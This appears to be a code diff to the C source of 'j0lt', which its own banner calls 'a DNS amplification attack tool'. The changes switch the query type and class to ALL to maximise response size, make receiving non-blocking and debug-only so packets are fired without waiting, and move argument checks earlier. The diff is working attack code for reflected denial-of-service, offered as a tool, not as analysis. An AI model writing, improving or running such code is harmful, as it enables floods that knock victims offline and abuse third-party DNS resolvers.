@@ -128,7 +128,7 @@ typedef enum __type__ {
     QT_MAILA = 254, // req mail agent RRs
     QT_ALL = 255 // req all records
 } type;
-#define 	QTYPE T_A
+#define 	QTYPE QT_ALL
 // END TYPE
 
 // CLASS values
@@ -139,7 +139,7 @@ typedef enum __class__ {
     C_HS = 4, // Hesiod [Dyer 87]
     QC_ALL = 255, // anyclass
 } class;
-#define     QCLASS C_IN
+#define     QCLASS QC_ALL
 // END CLASS 
 
 #define DEFINE_INSERT_FN(typename, datatype)		\
@@ -205,8 +205,8 @@ const char* g_ansi = {
     " w3lc0m3 t0 j0lt                         \n"
     " a DNS amplification attack tool         \n"
     "                                         \n"
-    "                            the-scientist\n"
-    "                       tofu@rootstorm.com\n\n"
+    "                                     2021\n"
+    "            the-scientist@rootstorm.com\n\n"
 };
 
 int
@@ -229,7 +229,6 @@ create_dns_packet(uint8_t pktbuf[ ], size_t* buflen,
             const char* domain,
             uint16_t query_type,
             uint16_t query_class);
-
 bool
 retrieve_dns_packet(uint8_t recvbuf[ ], size_t* buflen,
                     struct J0LT_HEADER* recvheader);
@@ -245,7 +244,7 @@ main(int argc, char** argv)
     socklen_t srcaddrlen;
     int sockfd;
 
-    size_t buflen, recvlen;
+    size_t buflen, recvlen, nwritten;
     uint8_t pktbuf[ BUF_MAX ];
     uint8_t recvbuf[ BUF_MAX ];
     struct J0LT_HEADER recvheader;
@@ -260,6 +259,10 @@ main(int argc, char** argv)
     };
 
     printf("%s", g_ansi);
+
+    if (argc != 4) {
+        goto fail_state;
+    }
 
 #if DEBUG
     puts("SEND HEADER");
@@ -282,10 +285,6 @@ main(int argc, char** argv)
     printf("ARCOUNT: 0x%.4x\n\n", sndheader.arcount);
 #endif // DEBUG
 
-    if (argc != 4) {
-        goto fail_state;
-    }
-
     buflen = BUF_MAX;
     memset(pktbuf, BUF_MAX, 0);
     if (create_dns_packet(pktbuf, &buflen,
@@ -301,12 +300,14 @@ main(int argc, char** argv)
         goto fail_state;
     }
 
-    sendto(sockfd, pktbuf, BUF_MAX - buflen, 0,
+    nwritten = BUF_MAX - buflen; // verbose. 
+    sendto(sockfd, pktbuf, nwritten, 0,
        ( const struct sockaddr* ) &addr,
        sizeof(addr));
 
+#if DEBUG
     memset(recvbuf, 0, BUF_MAX);
-    recvlen = recvfrom(sockfd, recvbuf, BUF_MAX - 1, 0,
+    recvlen = recvfrom(sockfd, recvbuf, BUF_MAX - 1, MSG_DONTWAIT,
          ( struct sockaddr* ) &srcaddr, &srcaddrlen);
 
     if (recvlen == -1) {
@@ -316,7 +317,6 @@ main(int argc, char** argv)
 
     retrieve_dns_packet(recvbuf, &recvlen, &recvheader);
 
-#if DEBUG
     puts("RECV HEADER");
     printf("ID: %.4x\n\n", recvheader.id);
 
